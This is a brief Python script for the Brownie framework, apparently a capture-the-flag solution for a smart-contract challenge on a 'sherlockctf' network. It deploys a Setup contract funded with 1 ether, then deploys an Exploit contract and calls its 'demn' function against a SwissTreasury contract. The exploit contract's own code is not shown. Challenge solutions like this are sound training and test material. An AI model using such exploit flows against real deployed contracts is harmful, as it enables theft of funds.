# Se ha de ejecutar primero: brownie console --network sherlockctf
from brownie import *

Setup.deploy({'from':accounts[0], 'amount':'1 ether'})
SwissTreasury.at(Setup[0].instance())

Exploit.deploy({'from':accounts[1]})

Exploit[0].demn(SwissTreasury[0], {'from': accounts[1]})